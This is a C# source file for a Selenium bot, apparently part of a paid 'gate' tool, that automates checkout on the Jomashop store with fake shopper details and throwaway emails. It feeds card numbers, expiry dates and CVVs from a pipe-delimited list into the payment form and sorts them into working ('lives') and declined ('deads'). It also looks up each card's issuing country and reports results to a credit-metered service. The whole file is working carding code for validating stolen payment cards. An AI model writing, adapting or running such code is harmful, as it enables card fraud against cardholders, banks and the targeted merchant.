using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using Keys = OpenQA.Selenium.Keys;

namespace gateDanny.gates
{
    class Jomashop
    {
        ChromeDriver driver;
        check check = new check();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {

            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 15)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        public void load()
        {

            check.login(Variables.key);
            if (int.Parse(Variables.creditos) <= 0)
            {
                MessageBox.Show("Recargue sus creditos");
                return;
            }

            var lines = Form1.listCC.Lines.Count();

            try
            {
                if (lines > 0 && Variables.run == true)
                {

                    Form1.circularProgressBar1.Value = 5;
                    var chromeOptions = new ChromeOptions();
                    correo = "joseffernana" + getNum() + "@gmail.com";
                    clave = "Jo." + getNum();

                    //chromeOptions.AddArguments(new List<string>() { "headless" });
                    //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, 
                    chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito", "--headless");

                    var chromeDriverService = ChromeDriverService.CreateDefaultService();
                    chromeDriverService.HideCommandPromptWindow = true;

                    driver = new ChromeDriver(chromeDriverService, chromeOptions);
                    driver.Url = "https://www.jomashop.com/beauty.html?beauty_product_type=Aftershave&price=%7B%22from%22%3A0%2C%22to%22%3A19.99%7D";
                    Thread.Sleep(1000);
                    correo = "joseffernana" + getNum() + "@hotmail.com";

                    //*[@id="product-list-wrapper"]/ul/li[1]/div/div[1]/a

                    //*[@id="product-list-wrapper"]/ul/li[18]/div/div[1]/a

                    var producto = "//*[@id='product-list-wrapper']/ul/li[" + RandomNumber(1, 12) + "]/div/div[1]/a";

                    if (tiempoElemento(By.XPath(producto)))
                    {
                        Form1.circularProgressBar1.Value = 10;
                        driver.Navigate().GoToUrl(driver.FindElement(By.XPath(producto)).GetAttribute("href"));
                        Thread.Sleep(300);
                    }
                    else
                    {
                        restart();
                    }

                    Thread.Sleep(2000);

                    if (IsElementPresent(By.XPath("//*[@id='maincontent']/div[1]/div[2]/div[2]/div[1]/div[3]/div[3]/div[1]/button")))
                    {
                        Form1.circularProgressBar1.Value = 20;
                        driver.FindElement(By.XPath("//*[@id='maincontent']/div[1]/div[2]/div[2]/div[1]/div[3]/div[3]/div[1]/button")).Click();
                        Thread.Sleep(2000);
                    }
                    else
                    {
                        restart();
                    }

                    if (IsElementPresent(By.XPath("//*[@id='root']/div/div[2]/div/div[3]/div/div/div[2]/div[3]/div/div[5]/div[1]/button")))
                    {
                        Form1.circularProgressBar1.Value = 20;
                        driver.FindElement(By.XPath("//*[@id='root']/div/div[2]/div/div[3]/div/div/div[2]/div[3]/div/div[5]/div[1]/button")).Click();
                        Thread.Sleep(2000);
                    }
                    //else
                    //{
                    //    restart();
                    //}



                    //if (IsElementPresent(By.XPath("//*[@id='maincontent']/div[1]/div[2]/div[2]/div/div[3]/div[3]/div[1]/button")))
                    //{
                    //    Form1.circularProgressBar1.Value = 30;
                    //    driver.FindElement(By.XPath("//*[@id='maincontent']/div[1]/div[2]/div[2]/div/div[3]/div[3]/div[1]/button")).Click();

                    //    Thread.Sleep(2000);
                    //}
                    //else
                    //{
                    //    restart();
                    //}



                    //Thread.Sleep(2000);

                    if (tiempoElemento(By.XPath("//*[@id='root']/div/div[2]/div/div[3]/div/div/div[2]/div[3]/div/div[6]/div[1]/button")))
                    {
                        Form1.circularProgressBar1.Value = 40;
                        driver.FindElement(By.XPath("//*[@id='root']/div/div[2]/div/div[3]/div/div/div[2]/div[3]/div/div[6]/div[1]/button")).Click();
                        Thread.Sleep(300);
                    }
                    //else
                    //{
                    //    restart();
                    //}

                    Thread.Sleep(2000);

                    if (tiempoElemento(By.XPath("//*[@id='maincontent']/div[1]/div/div[1]/div[2]/div/div/span[1]/input")))
                    {
                        Form1.circularProgressBar1.Value = 60;
                        driver.FindElement(By.Name("email")).SendKeys(correo);
                        driver.FindElement(By.Name("telephone")).SendKeys("2135673847");
                        driver.FindElement(By.Name("firstname")).SendKeys("DAVID");
                        driver.FindElement(By.Name("lastname")).SendKeys("KNO");
                        driver.FindElement(By.Name("street1")).SendKeys("STREET 36");
                        driver.FindElement(By.Name("postcode")).SendKeys("10001");
                        driver.FindElement(By.Name("city")).SendKeys("New York");
                        Thread.Sleep(500);
                        var region = new SelectElement(driver.FindElement(By.Name("region")));
                        region.SelectByValue("NY");
                        Thread.Sleep(5000);
                        try
                        {
                            driver.ExecuteJavaScript("document.querySelector('#maincontent > div.checkout-page > div > div.left-column > div.step-btn-block.next-btn-block > button').click();");
                            Thread.Sleep(2000);
                            driver.FindElement(By.XPath("//*[@id='maincontent']/div[1]/div/div[1]/div[4]/button")).Click();
                        }
                        catch (Exception ex)
                        {

                            Console.WriteLine(ex);
                        }

                        Thread.Sleep(1000);

                    }
                    else
                    {
                        restart();
                    }

                    Thread.Sleep(2000);

                    if (tiempoElemento(By.XPath("//*[@id='maincontent']/div[1]/div/div[1]/div[2]/div[2]/div/div[1]/div/label/div")))
                    {
                        Form1.circularProgressBar1.Value = 70;
                        driver.ExecuteJavaScript("document.querySelector('#maincontent > div.checkout-page > div > div.left-column > div:nth-child(2) > div.shipping-method-form > div > div:nth-child(1) > div > label > div').click();");
                        Thread.Sleep(2000);
                        driver.FindElement(By.XPath("//*[@id='maincontent']/div[1]/div/div[1]/div[3]/button")).Click();
                        Thread.Sleep(2000);

                    }
                    else
                    {
                        restart();
                    }
                    

                    Thread.Sleep(2000);
                                                  //*[@id="maincontent"]/div[1]/div/div[1]/div[2]/div[3]/div[1]/div[1]/button
                    if (tiempoElemento(By.XPath("//*[@id='maincontent']/div[1]/div/div[1]/div[2]/div[3]/div[1]/div[1]/button")))
                    {
                        pago();
                    }
                    else
                    {
                        restart();
                    }
                }
                else
                {
                    stop();
                }
            }
            catch (Exception)
            {

                if (Variables.run == true)
                {
                    restart();
                }
            }


        }


        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(3000);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {
            try
            {
                pagos = 0;

                driver.Close();
                driver.Quit();
                load();
            }
            catch (Exception)
            {
                pagos = 0;
                driver.Quit();
                load();
            }

        }

        private void pago()
        {
            try
            {
                var lines = Form1.listCC.Lines.Count();


                if (lines > 0)
                {
                    if (pagos < 5)
                    {
                        Form1.circularProgressBar1.Value = 90;
                        string cc = Form1.listCC.Lines[0];
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];

                        driver.ExecuteJavaScript("document.querySelector('#maincontent > div.checkout-page > div > div > div.left-column > div.payment-method-wrapper > div.accordion > div.authnetcim.card > div.card-header > button > div').click();");
                        Thread.Sleep(1000);
                        if (IsElementPresent(By.XPath("//*[@id='maincontent']/div[1]/div/div/div[1]/div[2]/div[3]/div[1]/div[2]/div/section/div[1]/form/div[1]/div[1]/input")))
                        {
                            driver.FindElement(By.XPath("//*[@id='maincontent']/div[1]/div/div/div[1]/div[2]/div[3]/div[1]/div[2]/div/section/div[1]/form/div[1]/div[1]/input")).SendKeys(ccLine[0]);
                            Thread.Sleep(300);
                            var mes = new SelectElement(driver.FindElement(By.XPath("//*[@id='exp-date']")));
                            mes.SelectByValue(Int16.Parse(ccLine[1]).ToString());
                            Thread.Sleep(500);
                            var anio = new SelectElement(driver.FindElement(By.XPath("//*[@id='exp-year']")));
                            anio.SelectByValue(ccLine[2]);
                            Thread.Sleep(500);
                            if (ccLine[3].Trim().Length == 3)
                            {
                                driver.FindElement(By.XPath("//*[@id='auth-cvv']")).SendKeys(ccLine[3]);
                            }

                            if (ccLine[3].Trim().Length == 4)
                            {
                                driver.FindElement(By.XPath("//*[@id='auth-cvv']")).SendKeys(ccLine[3]);
                            }

                            Thread.Sleep(2000);

                            if (tiempoElemento(By.XPath("//*[@id='maincontent']/div[1]/div/div/div[1]/div[2]/div[3]/div[1]/div[2]/div/section/button")))
                            {
                                try
                                {
                                    driver.ExecuteJavaScript("document.querySelector('#maincontent > div.checkout-page > div > div > div.left-column > div.payment-method-wrapper > div.accordion > div.authnetcim.open.card > div.collapse.show > div > section > button').click();");
                                    Thread.Sleep(2000);
                                    driver.FindElement(By.XPath("//*[@id='maincontent']/div[1]/div/div/div[1]/div[2]/div[3]/div[1]/div[2]/div/section/button")).Click();
                                    Thread.Sleep(7000);
                                }
                                catch (Exception ex)
                                {

                                    Console.WriteLine(ex);
                                }
                            }
                            else
                            {
                                restart();
                            }
                        }

                        if (confirmar())
                        {
                            Form1.circularProgressBar1.Value = 100;
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");
                            Form1.textBox1.AppendText(cc + " $" + RandomNumber(5, 15) + ".00  - " + checkbin(cc.Substring(0, 6)));
                            check.playlive();
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox1.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            Form1.circularProgressBar1.Value = 100;
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "deads");
                            Thread.Sleep(300);
                            Form1.textBox2.AppendText(cc);
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox2.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            pago();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
            }
            catch (Exception ex)
            {
                if (Variables.run == true)
                {
                    //MessageBox.Show(ex.ToString());
                    restart();
                }
                else
                {
                    stop();
                    return;
                }
            
            }

        }

        public void stop()
        {
            try
            {
                pagos = 0;
                numeroTargeta = 0;
                driver.Close();
                driver.Quit();
              
            }
            catch (Exception)
            {

                return;
            }
          
        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 10)
                {


                    if (IsElementPresent(By.XPath("//*[@id='maincontent']/div[1]/div/div/div[1]/div[2]/div[3]/div[1]/div[2]/div/section/div[4]/span")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='maincontent']/div[1]/div/div/div[1]/div[2]/div[3]/div[1]/div[2]/div/section/div[4]/span")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='maincontent']/div[1]/div/div/div[1]/div[2]/div[3]/div[1]/div[2]/div/section/div[4]/span")).Text.Trim() != "")
                            {
                                estado = "dead";
                            }
                        }
                    }

                    if (IsElementPresent(By.XPath("//*[@id='sa_header_text']")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='sa_header_text']")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='sa_header_text']")).Text.Trim() != "")
                            {
                                estado = "live";
                            }
                        }
                    }

                    if (IsElementPresent(By.XPath("//*[@id='maincontent']/div[1]/div/div/div/div[1]/div[2]/p[1]")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='maincontent']/div[1]/div/div/div/div[1]/div[2]/p[1]")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='maincontent']/div[1]/div/div/div/div[1]/div[2]/p[1]")).Text.Trim() != "")
                            {
                                estado = "live";
                            }
                        }
                    }
                }
                else
                {
                    estado = "error";
                }

                tiempo++;
            }

            if (estado == "dead")
            {
                driver.ExecuteJavaScript("document.querySelector('#maincontent > div.checkout-page > div > div > div.left-column > div.payment-method-wrapper > div.accordion > div.authnetcim.card > div.card-header > button > div').click();");
                Thread.Sleep(1000);

                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }


    }
}

